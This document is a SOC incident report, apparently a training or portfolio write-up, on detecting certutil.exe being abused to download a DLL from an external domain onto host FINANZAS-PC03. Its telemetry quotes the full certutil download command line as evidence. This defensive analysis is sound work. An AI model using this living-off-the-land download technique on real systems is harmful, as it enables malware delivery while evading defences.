# 🚨 SOC Incident Report: #8902 - Malicious Download via Certutil

**Analysis Date:** 2026-10-28  
**Analyst:** Mayra del Valle González  
**Severity:** 🔴 High / Critical  
**Final Verdict:** True Positive  
**MITRE ATT&CK Tactics:** Execution / Defense Evasion / Command and Control (T1105 - Ingress Tool Transfer)  

---

## 1. 📌 Executive Summary
A suspicious execution of the legitimate binary `certutil.exe` was detected on host `FINANZAS-PC03`. The tool was abused to download an unauthorized `.dll` file from an unknown external domain (`temp-storage-downloads.com`). The host was isolated from the network to prevent further execution or malware propagation.

---

## 2. 🔍 Event Telemetry (Evidence)

```text
Event ID: 1
Timestamp: 2026-10-28T15:45:12Z
Hostname: FINANZAS-PC03
User: CORP\c.rodriguez
Image: C:\Windows\System32\certutil.exe
CommandLine: certutil.exe -urlcache -split -f "[https://temp-storage-downloads.com/update.dll](https://temp-storage-downloads.com/update.dll)" C:\Users\Public\update.dll
ParentImage: C:\Windows\System32\cmd.exe
